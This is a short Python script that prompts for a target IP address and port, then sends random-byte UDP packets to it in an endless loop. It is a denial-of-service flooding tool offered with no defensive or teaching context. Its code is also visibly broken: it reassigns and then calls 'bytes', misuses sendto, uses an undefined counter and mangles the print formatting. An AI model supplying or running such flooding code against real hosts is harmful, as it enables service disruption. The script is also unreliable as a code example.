import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = input('Target IP: ')
port = input('Target Port: ')

while 1:
    sock.sendto(bytes(ip, port))
    print('Sent %s amount of packets to %s at port %s '(sent, ip, port))
    sent = sent+1
